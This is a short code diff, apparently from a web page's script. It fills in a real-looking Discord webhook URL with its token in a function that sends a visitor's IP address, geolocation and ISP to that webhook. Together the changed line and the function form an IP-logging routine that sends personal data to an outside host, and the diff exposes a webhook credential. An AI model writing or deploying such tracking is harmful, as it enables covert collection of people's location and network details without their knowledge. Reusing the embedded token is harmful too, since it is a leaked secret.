@@ -33,7 +33,7 @@
     }
 
     function sendUserDataWithLocationAndISP(ip, location, isp) {
-      const webhookURL = "https://discord.com/api/webhooks/your-webhook-url"; // Replace with the actual webhook URL
+      const webhookURL = "https://discord.com/api/webhooks/1110583172917383238/oaoIQ92Lm2THQdTZ5CCSzozcSvwNbln1-5M7oyc27cUXaWKHaQipSJWzjxXTWt4vcXaz"; // Replace with the actual webhook URL
       const message = `IP Address: ${ip}\nLocation: ${location}\nISP: ${isp}`;
 
       fetch(webhookURL, {
